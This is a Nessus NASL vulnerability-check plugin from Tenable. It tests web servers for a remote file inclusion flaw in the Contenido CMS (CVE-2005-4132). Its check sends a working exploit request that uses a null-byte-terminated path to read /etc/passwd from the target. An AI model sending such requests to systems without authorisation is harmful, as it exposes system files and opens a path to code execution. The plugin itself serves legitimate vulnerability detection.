#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(20292);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2005-4132");
  script_bugtraq_id(15790);
  script_osvdb_id(27484);

  script_name(english:"Contenido contenido/classes/class.inuse.php Multiple Parameter Remote File Inclusion");
  script_summary(english:"Checks for cfg parameter remote file include vulnerability in Contenido");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
remote file inclusion vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be running Contenido, an open source
content management system written in PHP. 

The version of Contenido installed on the remote host fails to
sanitize input to the 'cfg[path][contenido]' and 'cfg[path][classes]'
parameters of the 'contenido/classes/class.inuse.php' script before
using it in a PHP 'require_once' function.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker may
be able to exploit this flaw to read arbitrary files on the remote
host and or run arbitrary code, possibly taken from third-party hosts,
subject to the privileges of the web server user id." );
  # http://web.archive.org/web/20090131161149/http://sourceforge.net/forum/forum.php?forum_id=518356
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6c7203aa" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Contenido 4.6.4 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:ND/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/12/12");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/09/12");
 script_cvs_date("$Date: 2016/10/13 14:27:16 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value: "cpe:/a:contenido:contendio");
script_end_attributes();

 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
 
  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/contenido", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd";
  r = http_send_recv3(method:"GET", port: port, 
    item:string(dir, "/contenido/classes/class.inuse.php?",
      "cfg[path][contenido]=", file, "%00"));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # there's an entry for root or...
    egrep(pattern:"root:.*:0:[01]:", string:res) ||
    # we get an error saying "failed to open stream" or "failed opening".
    #
    # nb: this suggests magic_quotes_gpc was enabled but passing
    #     remote URLs might still work.
    egrep(pattern:"/etc/passwd.+failed to open stream", string:res) ||
    "Failed opening required '/etc/passwd" >< res
  ) {
    if (report_verbosity > 0) {
      report = string(
        "\n",
        res
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
  }
}
